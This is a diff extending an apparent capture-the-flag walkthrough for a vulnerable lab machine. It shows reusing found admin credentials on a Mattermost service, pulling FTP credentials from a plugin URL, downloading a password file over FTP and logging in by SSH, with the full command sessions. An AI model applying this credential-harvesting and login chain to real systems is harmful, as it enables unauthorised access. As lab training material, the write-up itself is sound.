@@ -144,4 +144,81 @@ Hello Admin,
 Please use the following key: ComplexPassword0!
 ```
 
-We got some creds! `admin:ComplexPassword0!`
+We got some creds! `admin:ComplexPassword0!` we can use them under port `8065`, there Mattermost is running an open-source online chat service & we're in!
+
+After some enumeration under `plugin marketplace`, i noticed the `zoom` plugin has a weird URL :
+
+![](https://i.imgur.com/gUCqB6k.png)
+
+I used inspect element to copy the link and it gives us some creds for `ftp` : 
+
+```
+$ curl http://$ip/JK94vsNKAns6HBkG/AxRt6LwuA7A6N4gk/index.html
+Hello Admin,
+
+FTP credentials help you edit, transfer and delete files from your site. This is why it's important to keep these credentials handy.
+
+FTP Credentials: ftpuser / ftppassword
+
+Make sure to keep these to yourself.
+```
+
+## Shell as mattermost
+
+After we login into, we can see a user `mattermost` with a `Welcome!!!` message.
+
+```
+$ ftp $ip
+Connected to 192.168.1.6.
+220 (vsFTPd 3.0.3)
+Name (192.168.1.6:root): ftpuser
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    3 ftp      ftp          4096 Jan 05 14:11 .
+drwxr-xr-x    4 ftp      ftp          4096 Jan 05 13:59 ..
+-rw-r--r--    1 ftp      ftp           220 Jan 05 13:59 .bash_logout
+-rw-r--r--    1 ftp      ftp          3771 Jan 05 13:59 .bashrc
+-rw-r--r--    1 ftp      ftp           807 Jan 05 13:59 .profile
+-rw-r--r--    1 ftp      ftp          8980 Jan 05 13:59 examples.desktop
+drwxr-xr-x    3 ftp      ftp          4096 Jan 05 14:11 users
+226 Directory send OK.
+ftp> cd users
+250 Directory successfully changed.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 ftp      ftp          4096 Jan 05 14:11 mattermost
+226 Directory send OK.
+ftp> cd mattermost
+250 Directory successfully changed.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 ftp      ftp            11 Jan 05 14:11 message
+226 Directory send OK.
+ftp> get message
+local: message remote: message
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for message (11 bytes).
+226 Transfer complete.
+11 bytes received in 0.00 secs (9.8643 kB/s)
+ftp> exit
+221 Goodbye.
+$ cat message 
+Welcome!!!
+```
+
+I tried them `mattermost:Welcome!!!` with SSH and i got in!
+
+```
+$ ssh mattermost@$ip
+mattermost@192.168.1.6's password: 
+mattermost@ubuntu:~$ whoami
+mattermost
+```
